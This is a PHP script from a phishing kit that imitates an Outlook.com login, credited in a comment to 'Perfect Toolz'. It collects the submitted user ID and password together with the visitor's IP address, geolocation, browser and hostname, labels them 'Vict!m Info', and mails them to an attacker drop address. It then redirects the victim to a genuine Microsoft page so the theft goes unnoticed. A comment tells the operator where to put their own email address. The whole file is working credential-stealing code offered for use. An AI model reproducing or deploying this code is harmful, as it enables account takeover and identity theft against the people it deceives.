<? include ("images/sec.gif");
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Outlook.com Info-----------------------\n";
$message .= "User ID        : ".$_POST['userid']."\n";
$message .= "Password       : ".$_POST['pass']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY Perfect Toolz-------------\n";
//change ur email here
$send = "office365@94.33mail.com";
$subject = "Result from Outlook.com";
$headers = "From: Outlook 2017<supertool>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";mail($userinfo,$subject,$message,$headers);
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);


 }
    header("Location: https://account.microsoft.com/privacy");
  ?>